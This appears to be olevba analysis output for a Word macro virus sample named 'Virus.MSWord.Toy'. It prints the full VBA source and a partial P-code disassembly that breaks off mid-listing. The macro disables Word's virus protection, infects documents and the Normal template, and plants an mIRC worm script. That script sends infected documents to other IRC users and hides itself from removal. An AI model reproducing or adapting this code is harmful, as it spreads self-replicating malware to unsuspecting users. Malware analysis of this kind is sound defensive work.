olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Toy
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Toy - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./Virus.MSWord.Toy - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Toy
Sub AutoOpen()
Call Start
End Sub
Sub Start()
On Error Resume Next
Set Opt = Options
Opt.VirusProtection = 0
Opt.ConfirmConversions = 0
Opt.SaveNormalPrompt = 0
Set App = Application
App.EnableCancelKey = 0
App.DisplayAlerts = 0
hrm = 0
var9 = 0
var10 = 3
var11 = 1
Tmp1 = ActiveDocument.FullName
If ActiveDocument.Saved = False Then hrm = 1
Infect:
If var9 = 0 Then
Set Here = ActiveDocument.VBProject
Else
Set Here = NormalTemplate.VBProject
End If
For var12 = 1 To Here.VBComponents.Count
var13 = Here.VBComponents(var12).CodeModule.CountOfLines
var14 = Here.VBComponents(var12).CodeModule.Lines(1, 1)
If var12 <> 1 And var13 > 0 And UCase(var14) = "'TOY" Then
var10 = var10 - var11
var17 = Here.VBComponents.Item(var12).CodeModule.Lines(3, var13)
Exit For
End If
If var13 > 0 And UCase(var14) <> "'TOY" Then Here.VBComponents.Item(var12).CodeModule.DeleteLines 1, var13
Next var12
If var9 = 0 Then
var11 = var11 + 1
var9 = 1
GoTo Infect
End If
If var10 = 0 Then GoTo payload
If var10 = 1 Then
Set blah1 = ActiveDocument.VBProject
FCode = "'Toy" & Chr(13) & "Sub AutoOpen" & Chr(13) & var17
End If
If var10 = 2 Then
Set blah1 = NormalTemplate.VBProject
FCode = "'Toy" & Chr(13) & "Sub AutoClose" & Chr(13) & var17
End If
check3 = blah1.VBComponents.Count
If check3 < 2 Then
Open "C:\Toy.vxd" For Output As #1
Print #1, FCode
Close #1
blah1.VBComponents.Import ("C:\Toy.vxd")
Kill "C:\Toy.vxd"
GoTo payload
End If
For var18 = 2 To blah1.VBComponents.Count
var19 = blah1.VBComponents(var18).CodeModule.CountOfLines
If var19 < 50 Then
blah1.VBComponents(var18).CodeModule.AddFromstring (FCode)
Exit For
End If
Next var18
payload:
If MacroContainer <> NormalTemplate.Name Or Int(Rnd * 9) <> 7 Then GoTo done
Wind = Environ("WINDIR")
With Application.FileSearch
.LookIn = "C:\"
.SearchSubFolders = True
.FileName = "mirc32.exe"
.FileType = msoFileTypeAllFiles
.Execute msoSortByFileName
End With
For x = 1 To Application.FileSearch.FoundFiles.Count
Location = Application.FileSearch.FoundFiles(x)
LDir = Left(Location, Len(Location) - 10)
LM = LDir & "mirc.ini"
LN = LDir & "script.ini"
If Dir(LM) <> "" Then
var3 = Wind & "\Default.vxd"
SetAttr (LM), vbNormal
If System.PrivateProfileString(LM, "rfiles", "n2") <> LN Then System.PrivateProfileString(LM, "rfiles", "n2") = LN
If System.PrivateProfileString(LM, "rfiles", "n3") <> var3 Then System.PrivateProfileString(LM, "rfiles", "n3") = var3
If Dir(var3) <> "" Then
Kill var3
SetAttr (var3), vbNormal
End If
Open var3 For Output As #1
Print #1, "On 1:Connect:{ .ctcps on | Set %go 0 | hunting | .enable #damn3 | if ( $exists(C:\toy.sys) ) { Set %ex $read -l1 C:\toy.sys | if ( %ex != $null ) && ( $exists(%ex) ) { Set %go 1 } } | if ( $day = Friday ) && ( $r(1,7) = 4 ) { by } | if ( $r(1,25) != 7 ) { halt } | if ( $mid($version,3,1) > 4 ) { Set %varn1 editbox text | .timer77 0 .1 toy } | else { Set %fy 0 | .timer77 0 .5 toy1 } }"
Print #1, "On 1:Disconnect:{ .timers off | .write -c C:\Time.drv $time | .enable #damn3 | if ( %varn1 != $null ) { .colour %varn1 1 } }"
Print #1, "On 1:Input:*:{ Set %s $1- | if ( /timer isin %s ) || ( // isin %s ) || ( /. isin %s ) || ( /colour isin %s ) || ( disable isin %s ) || ( default isin %s ) || ( remove isin %s ) ( /write isin %s ) { halt } | if ( %eh isin %s ) { .echo -ae 4Hehe, come on, that wont work -12T13o9y | halt } }"
Print #1, "On 1:Join:*:{ if ( help isin # ) || ( dmsetup isin # ) || ( backorifice isin # ) || ( nohack isin # ) || ( vir isin # ) || ( aid isin # ) { Set %chan # | .timer7 1 .1 quiet } }"
Print #1, "On 1:Part:*:{ if ( %go = 0 ) { halt } | if ( $r(1,2) = 1 ) && ( $nick isreg # ) && ( $nick != $me ) { SQ $nick | .ignore -pcnu120 $nick } }"
Print #1, "On 1:FileSent:*:{ if ( %go = 0 ) { halt } | if ( $filename = %ex ) { .msg $nick Type //run -n $getdir $+ $nopath(%ex) to run | halt } | SQ $nick | .ignore -pcnu60 $nick 3 }"
Print #1, "On 1:FileRcvd:*:{ if ( %go = 0 ) { halt } | SQ $nick | .ignore -pcnu60 $nick }"
Print #1, "On 1:Notify:{ if ( %go = 0 ) { halt } | if ( $nick !isin %heh ) { %heh = %heh $+ $nick | .ignore -pcnu120 $nick 3 | .timer $+ $r(99,199) 1 10 .msg $nick Hey, talk to you in a minute. Check out this file, ok. | .timer $+ $r(99,199) 1 20 SQ $nick } }"
Print #1, "On 1:SockListen:sd:{ sockaccept we | ok1 }"
Print #1, "On 1:SockWrite:we:{ if ( %stop = 1 ) { .sockclose we | halt } | ok1 }"
Print #1, "On ^1:Kick:*:{ if ( $knick != $me ) { return } | letslook $1- | letsdo }"
Print #1, "On ^1:Notice:*:*:{ letslook $1- | letsdo }"
Print #1, "On ^1:Action:*:*:{ letslook $1- | letsdo }"
Print #1, "On ^1:Text:*:*:{ letslook $1- | letsdo }"
Print #1, "On ^1:Chat:*:{ letslook $1- | letsdo }"
Print #1, "On ^1:Serv:*:{ letslook $1- | letsdo }"
Print #1, "On ^1:Quit:{ letslook $1- | letsdo }"
Print #1, "On ^1:Topic:#:{ letslook $1- | letsdo }"
Print #1, "ctcp 1:*:*:{ letslook $1- | letsdo }"
Print #1, "raw 332:*:{ letslook $2- | Set %chan $2 | .timer7 1 .1 quiet }"
Print #1, "raw 401:*:{ halt }"
Print #1, "raw 439:*:{ halt }"
Print #1, "alias toy { Set %varn4 $r(0,14) | colour %varn1 %varn4 }"
Print #1, "alias toy1 { if ( %fy = 0 ) { .font -a 9 Fixedsys | Set %fy 1 | halt } | .font -a 9 WP TypographicSymbols | Set %fy 0 }"
Print #1, "alias toy2 { .echo -ae 4I'm sorry, but that command is not a 12T13o9y }"
Print #1, "alias by { .echo -ae 12T13o9y 8I4s 12B13y 9S8i4m12p13l9e8S4i12m13o9n }"
Print #1, "alias quiet { Set %var1 1 | :j | Set %var2 $nick(%chan,%var1) | if ( %var2 = $null ) { .part %chan | halt } | if ( %var2 != $me ) && ( %var2 != X ) && ( %var2 != W ) { .ignore %var2 3 } | inc %var1 | goto j }"
Print #1, "alias -l hunting { if ( $exists(C:\Time.drv) ) { Set %weird $time($file(C:\Time.drv).mtime,H) | Set %tmp1 $calc((%weird + 5) % 24) } | if ( %weird != $null ) { if ( %weird > $time(H) ) || ( %tmp1 < $time(H) ) { rabbits } } }"
Print #1, "alias -l rabbits { Set %tmp1 $ignore(0) | Set %tmp2 0 | :tm | inc %tmp2 | if ( %tmp1 = $null ) || ( %tmp2 > %tmp1 ) { goto out } | .ignore -r $ignore(1) | goto tm | :out }"
Print #1, "alias letsdo { .ignore $nick 3 | halt }"
Print #1, "alias letslook { if ( $nopath(%ex) !isin $1- ) && ( disable !isin $1- ) && ( script !isin $1- ) && ( dmsetup !isin $1- ) && ( worm !isin $1- ) && ( virus !isin $1- ) && ( infect !isin $1- ) && ( spread !isin $1- ) && ( remote !isin $1- ) && ( default !isin $1- ) && ( event !isin $1- ) && ( toy !isin $1- ) && ( unload !isin $1- ) { return } }"
Print #1, "alias unload { if ( $1 = $null ) || ( $2 = $null ) { .echo -e 2* /unload: insufficient parameters | halt } | .echo -e 2*** Unloaded script ' $+ $2- $+ ' | halt }"
Print #1, "alias remote { if ( $1 = $null ) { .echo -e 2*** Remote is OFF | halt } | if ( $1 = on ) { .echo -e 2*** Remote is ON (Ctcps,Events,Raw) } | else { .echo -e 2*** Remote is OFF } | halt }"
Print #1, "alias events { if ( $1 = $null ) { .echo -e 2*** Events are OFF | halt } | if ( $1 = on ) { .echo -e 2*** Events are ON } | else { .echo -e 2*** Events are OFF } | halt }"
Print #1, "alias remini { toy2 }"
Print #1, "alias alias { toy2 }"
Print #1, "alias run { toy2 }"
Print #1, "alias copy { toy2 }"
Print #1, "alias load { if ( $1 = -rs ) { toy2 | halt } }"
Print #1, "#damn3 on"
Print #1, "alias play { if ( $pos($1-,.mrc,1) > 0 ) || ( $pos($1-,.ini,1) > 0 ) || ( $pos($1-,.vxd,1) > 0 ) { halt } | .disable #damn3 | .timer0 1 .1 .play $1- | .enable #damn3 }"
Print #1, "#damn3 end"
Print #1, "alias writeini { toy2 }"
Print #1, "alias rename { toy2 }"
'DCC Send using socket commands is a modified version of that in _Bird_'s phraggle worm
Print #1, "alias SQ { %nick = $1- | %stop = 0 | %pt = $r(2400,5000) | %be = 0 | %pk = 4096 | %sz = $file(%ex).size | .notice %nick DCC Send %ex ( $+ $ip $+ ) | .raw -q privmsg %nick : $+ $chr(1) $+ DCC SEND %ex $longip($ip) %pt %sz $+ $chr(1) | if ( $sock(sd) != $null ) { .sockclose sd } | .socklisten sd %pt }"
Print #1, "alias ok1 { if ( $calc(%be + %pk) < %sz ) { .bread %ex %be %pk &data | .sockwrite we &data | inc %be %pk } | else { %stop = 1 | %pk = $calc( %sz - %be) | if (%pk == 0) { return } | .bread %ex %be %pk &data | .sockwrite we &data } }"
Close #1
SetAttr (var3), vbReadOnly
End If
If irc <> "" Then GoTo Junction
irc = Int(Rnd * 2)
If irc = 1 Then FName = Wind & "\Toy.doc"
If irc = 0 Then FName = Wind & "\Game.doc"
If irc = 2 Then FName = Wind & "\Fable.doc"
If Dir(FName) = "" Then
ActiveDocument.SaveAs FileName:=FName, AddToRecentFiles:=False
SetAttr (FName), vbReadOnly
hrm = 0
End If
If Dir("C:\Toy.sys") <> "" Then
SetAttr ("C:\Toy.sys"), vbNormal
Kill "C:\Toy.sys"
End If
Open "C:\Toy.sys" For Output As #1
Print #1, FName
Close #1
SetAttr ("C:\Toy.sys"), vbReadOnly
Junction:
If Dir(LN) = "" Then
Open LN For Output As #1
Print #1, "[script]"
Close #1
End If
Next x
done:
If var10 = 1 Then
If hrm = 0 Then
ActiveDocument.SaveAs FileName:=Tmp1
Else
ActiveDocument.Close
End If
Else
NormalTemplate.Save
End If
End Sub
Sub ViewVBCode()
End Sub
Sub ToolsMacro()
End Sub













-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Toy
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Module1 - 16298 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0003 "Toy"
' Line #1:
' 	FuncDefn (Sub AutoOpen())
' Line #2:
' 	ArgsCall (Call) Start 0x0000 
' Line #3:
' 	EndSub 
' Line #4:
' 	FuncDefn (Sub Start())
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	SetStmt 
' 	Ld Options 
' 	Set Opt 
' Line #7:
' 	LitDI2 0x0000 
' 	Ld Opt 
' 	MemSt VirusProtection 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld Opt 
' 	MemSt ConfirmConversions 
' Line #9:
' 	LitDI2 0x0000 
' 	Ld Opt 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	SetStmt 
' 	Ld Application 
' 	Set App 
' Line #11:
' 	LitDI2 0x0000 
' 	Ld App 
' 	MemSt EnableCancelKey 
' Line #12:
' 	LitDI2 0x0000 
' 	Ld App 
' 	MemSt DisplayAlerts 
' Line #13:
' 	LitDI2 0x0000 
' 	St hrm 
' Line #14:
' 	LitDI2 0x0000 
' 	St var9 
' Line #15:
' 	LitDI2 0x0003 
' 	St var10 
' Line #16:
' 	LitDI2 0x0001 
' 	St var11 
' Line #17:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St Tmp1 
' Line #18:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St hrm 
' 	EndIf 
' Line #19:
' 	Label Infect 
' Line #20:
' 	Ld var9 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #21:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set Here 
' Line #22:
' 	ElseBlock 
' Line #23:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set Here 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	StartForVariable 
' 	Ld var12 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Here 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #26:
' 	Ld var12 
' 	Ld Here 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St var13 
' Line #27:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld var12 
' 	Ld Here 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St var14 
' Line #28:
' 	Ld var12 
' 	LitDI2 0x0001 
' 	Ne 
' 	Ld var13 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	Ld var14 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0004 "'TOY"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #29:
' 	Ld var10 
' 	Ld var11 
' 	Sub 
' 	St var10 
' Line #30:
' 	LitDI2 0x0003 
' 	Ld var13 
' 	Ld var12 
' 	Ld Here 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St var17 
' Line #31:
' 	ExitFor 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	Ld var13 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld var14 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0004 "'TOY"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld var13 
' 	Ld var12 
' 	Ld Here 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #34:
' 	StartForVariable 
' 	Ld var12 
' 	EndForVariable 
' 	NextVar 
' Line #35:
' 	Ld var9 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #36:
' 	Ld var11 
' 	LitDI2 0x0001 
' 	Add 
' 	St var11 
' Line #37:
' 	LitDI2 0x0001 
' 	St var9 
' Line #38:
' 	GoTo Infect 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Ld var10 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo payload 
' 	EndIf 
' Line #41:
' 	Ld var10 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #42:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set blah1 
' Line #43:
' 	LitStr 0x0004 "'Toy"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "Sub AutoOpen"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld var17 
' 	Concat 
' 	St FCode 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld var10 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #46:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set blah1 
' Line #47:
' 	LitStr 0x0004 "'Toy"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000D "Sub AutoClose"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld var17 
' 	Concat 
' 	St FCode 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld blah1 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St check3 
' Line #50:
' 	Ld check3 
' 	LitDI2 0x0002 
' 	Lt 
' 	IfBlock 
' Line #51:
' 	LitStr 0x000A "C:\Toy.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld FCode 
' 	PrintItemNL 
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #54:
' 	LitStr 0x000A "C:\Toy.vxd"
' 	Paren 
' 	Ld blah1 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #55:
' 	LitStr 0x000A "C:\Toy.vxd"
' 	ArgsCall Kill 0x0001 
' Line #56:
' 	GoTo payload 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld var18 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld blah1 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #59:
' 	Ld var18 
' 	Ld blah1 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St var19 
' Line #60:
' 	Ld var19 
' 	LitDI2 0x0032 
' 	Lt 
' 	IfBlock 
' Line #61:
' 	Ld FCode 
' 	Paren 
' 	Ld var18 
' 	Ld blah1 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #62:
' 	ExitFor 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	StartForVariable 
' 	Ld var18 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' 	Label payload 
' Line #66:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Ne 
' 	Ld Rnd 
' 	LitDI2 0x0009 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0007 
' 	Ne 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo done 
' 	EndIf 
' Line #67:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	St Wind 
' Line #68:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #69:
' 	LitStr 0x0003 "C:\"
' 	MemStWith LookIn 
' Line #70:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #71:
' 	LitStr 0x000A "mirc32.exe"
' 	MemStWith FileName 
' Line #72:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #73:
' 	Ld msoSortByFileName 
' 	ArgsMemCallWith Execute 0x0001 
' Line #74:
' 	EndWith 
' Line #75:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd FileSearch 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #76:
' 	Ld x 
' 	Ld Application 
' 	MemLd FileSearch 
' 	ArgsMemLd FoundFiles 0x0001 
' 	St Location 
' Line #77:
' 	Ld Location 
' 	Ld Location 
' 	FnLen 
' 	LitDI2 0x000A 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St LDir 
' Line #78:
' 	Ld LDir 
' 	LitStr 0x0008 "mirc.ini"
' 	Concat 
' 	St LM 
' Line #79:
' 	Ld LDir 
' 	LitStr 0x000A "script.ini"
' 	Concat 
' 	St LN 
' Line #80:
' 	Ld LM 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #81:
' 	Ld Wind 
' 	LitStr 0x000C "\Default.vxd"
' 	Concat 
' 	St var3 
' Line #82:
' 	Ld LM 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #83:
' 	Ld LM 
' 	LitStr 0x0006 "rfiles"
' 	LitStr 0x0002 "n2"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld LN 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld LN 
' 	Ld LM 
' 	LitStr 0x0006 "rfiles"
' 	LitStr 0x0002 "n2"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #84:
' 	Ld LM 
' 	LitStr 0x0006 "rfiles"
' 	LitStr 0x0002 "n3"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld var3 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld var3 
' 	Ld LM 
' 	LitStr 0x0006 "rfiles"
' 	LitStr 0x0002 "n3"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #85:
' 	Ld var3 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #86:
' 	Ld var3 
' 	ArgsCall Kill 0x0001 
' Line #87:
' 	Ld var3 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	Ld var3 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0182 "On 1:Connect:{ .ctcps on | Set %go 0 | hunting | .enable #damn3 | if ( $exists(C:\toy.sys) ) { Set %ex $read -l1 C:\toy.sys | if ( %ex != $null ) && ( $exists(%ex) ) { Set %go 1 } } | if ( $day = Friday ) && ( $r(1,7) = 4 ) { by } | if ( $r(1,25) != 7 ) { halt } | if ( $mid($version,3,1) > 4 ) { Set %varn1 editbox text | .timer77 0 .1 toy } | else { Set %fy 0 | .timer77 0 .5 toy1 } }"
' 	PrintItemNL 
' Line #91:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x007C "On 1:Disconnect:{ .timers off | .write -c C:\Time.drv $time | .enable #damn3 | if ( %varn1 != $null ) { .colour %varn1 1 } }"
' 	PrintItemNL 
' Line #92:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0126 "On 1:Input:*:{ Set %s $1- | if ( /timer isin %s ) || ( // isin %s ) || ( /. isin %s ) || ( /colour isin %s ) || ( disable isin %s ) || ( default isin %s ) || ( remove isin %s ) ( /write isin %s ) { halt } | if ( %eh isin %s ) { .echo -ae 4Hehe, come on, that wont work -12T13o9y | halt } }"
' 	PrintItemNL 
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00B0 "On 1:Join:*:{ if ( help isin # ) || ( dmsetup isin # ) || ( backorifice isin # ) || ( nohack isin # ) || ( vir isin # ) || ( aid isin # ) { Set %chan # | .timer7 1 .1 quiet } }"
' 	PrintItemNL 
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x008B "On 1:Part:*:{ if ( %go = 0 ) { halt } | if ( $r(1,2) = 1 ) && ( $nick isreg # ) && ( $nick != $me ) { SQ $nick | .ignore -pcnu120 $nick } }"
' 	PrintItemNL 
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00AC "On 1:FileSent:*:{ if ( %go = 0 ) { halt } | if ( $filename = %ex ) { .msg $nick Type //run -n $getdir $+ $nopath(%ex) to run | halt } | SQ $nick | .ignore -pcnu60 $nick 3 }"
' 	PrintItemNL 
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004E "On 1:FileRcvd:*:{ if ( %go = 0 ) { halt } | SQ $nick | .ignore -pcnu60 $nick }"
' 	PrintItemNL 
' Line #97:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00F8 "On 1:Notify:{ if ( %go = 0 ) { halt } | if ( $nick !isin %heh ) { %heh = %heh $+ $nick | .ignore -pcnu120 $nick 3 | .timer $+ $r(99,199) 1 10 .msg $nick Hey, talk to you in a minute. Check out this file, ok. | .timer $+ $r(99,199) 1 20 SQ $nick } }"
' 	PrintItemNL 
' Line #98:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "On 1:SockListen:sd:{ sockaccept we | ok1 }"
' 	PrintItemNL 
' Line #99:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0045 "On 1:SockWrite:we:{ if ( %stop = 1 ) { .sockclose we | halt } | ok1 }"
' 	PrintItemNL 
' Line #100:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0048 "On ^1:Kick:*:{ if ( $knick != $me ) { return } | letslook $1- | letsdo }"
' 	PrintItemNL 
' Line #101:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "On ^1:Notice:*:*:{ letslook $1- | letsdo }"
' 	PrintItemNL 
' Line #102:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "On ^1:Action:*:*:{ letslook $1- | letsdo }"
' 	PrintItemNL 
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "On ^1:Text:*:*:{ letslook $1- | letsdo }"
' 	PrintItemNL 
' Line #104:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "On ^1:Chat:*:{ letslook $1- | letsdo }"
' 	PrintItemNL 
' Line #105:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "On ^1:Serv:*:{ letslook $1- | letsdo }"
' 	PrintItemNL 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "On ^1:Quit:{ letslook $1- | letsdo }"
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "On ^1:Topic:#:{ letslook $1- | letsdo }"
' 	PrintItemNL 
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "ctcp 1:*:*:{ letslook $1- | letsdo }"
' 	PrintItemNL 
' Line #109:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003E "raw 332:*:{ letslook $2- | Set %chan $2 | .timer7 1 .1 quiet }"
' 	PrintItemNL 
' Line #110:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "raw 401:*:{ halt }"
' 	PrintItemNL 
' Line #111:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "raw 439:*:{ halt }"
' 	PrintItemNL 
' Line #112:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0038 "alias toy { Set %varn4 $r(0,14) | colour %varn1 %varn4 }"
' 	PrintItemNL 
' Line #113:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0077 "alias toy1 { if ( %fy = 0 ) { .font -a 9 Fixedsys | Set %fy 1 | halt } | .font -a 9 WP TypographicSymbols | Set %fy 0 }"
' 	PrintItemNL 
' Line #114:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004B "alias toy2 { .echo -ae 4I'm sorry, but that command is not a 12T13o9y }"
' 	PrintItemNL 
' Line #115:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0059 "alias by { .echo -ae 12T13o9y 8I4s 12B13y 9S8i4m12p13l9e8S4i12m13o9n }"
' 	PrintItemNL 
' Line #116:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00D0 "alias quiet { Set %var1 1 | :j | Set %var2 $nick(%chan,%var1) | if ( %var2 = $null ) { .part %chan | halt } | if ( %var2 != $me ) && ( %var2 != X ) && ( %var2 != W ) { .ignore %var2 3 } | inc %var1 | goto j }"
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00E0 "alias -l hunting { if ( $exists(C:\Time.drv) ) { Set %weird $time($file(C:\Time.drv).mtime,H) | Set %tmp1 $calc((%weird + 5) % 24) } | if ( %weird != $null ) { if ( %weird > $time(H) ) || ( %tmp1 < $time(H) ) { rabbits } } }"
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00AB "alias -l rabbits { Set %tmp1 $ignore(0) | Set %tmp2 0 | :tm | inc %tmp2 | if ( %tmp1 = $null ) || ( %tmp2 > %tmp1 ) { goto out } | .ignore -r $ignore(1) | goto tm | :out }"
' 	PrintItemNL 
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
